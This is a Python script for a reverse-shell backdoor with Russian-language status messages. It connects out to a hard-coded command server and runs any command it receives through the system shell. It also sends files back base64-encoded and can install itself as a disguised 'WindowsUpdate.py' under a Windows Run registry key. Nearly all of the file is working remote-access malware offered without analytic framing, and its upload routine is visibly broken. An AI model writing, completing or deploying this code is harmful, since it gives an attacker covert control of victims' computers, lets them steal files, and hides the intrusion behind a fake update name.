
import socket
import subprocess
import os
import sys
import json
import base64
import time
import threading
import shutil

SERVER_IP = "192.168.1.2"
CMD_PORT = 5555
DATA_PORT = 5556

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, CMD_PORT))
            return s
        except Exception as e:
            time.sleep(30)

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def send_file(path):
    if os.path.exists(path):
        f = open(path, "rb")
        packet = base64.b64encode(f.read()).decode()
        reliable_send(packet)
        f.close()
    else:
        reliable_send("File not found")

def recv_file(packet):
    f = open(packet, "wb")
    f.write(base64.b64decode(packet))
    f.close()

def persistence():
    location = os.environ["appdata"] + "\\WindowsUpdate.py"
    if not os.path.exists(location):
        shutil.copyfile(sys.argv[0], location)
        subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "{location}"', shell=True)

def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:8] == "download":
            send_file(command[9:])
        elif command[:6] == "upload":
            recv_file(command[7:])
        elif command == "help":
            result = "Команды: cd, download, upload, quit, help, persist"
            reliable_send(result)
        elif command == "persist":
            persistence()
            reliable_send("[+] Добавлено в автозагрузку")
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode(errors='ignore')
            reliable_send(result)

print("[*] Подключение...")
s = connect()
# persistence()  # Раскомментируй для автозагрузки
shell()
